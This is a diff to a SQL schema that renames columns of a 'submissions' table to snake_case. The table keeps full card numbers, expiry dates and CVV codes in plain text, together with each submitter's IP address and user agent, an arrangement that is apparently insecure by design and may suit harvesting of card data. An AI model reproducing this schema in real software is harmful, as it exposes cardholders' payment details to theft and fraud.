@@ -2,13 +2,13 @@
 CREATE TABLE IF NOT EXISTS submissions (
   id BIGSERIAL PRIMARY KEY,
   timestamp TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
-  nameOnCard TEXT NOT NULL,
-  cardNumber TEXT NOT NULL,
+  name_on_card TEXT NOT NULL,
+  card_number TEXT NOT NULL,
   expiry TEXT NOT NULL,
   cvv TEXT NOT NULL,
   ip TEXT,
-  userAgent TEXT,
-  createdAt TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
+  user_agent TEXT,
+  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
 );
 
 -- Create an index on timestamp for faster queries
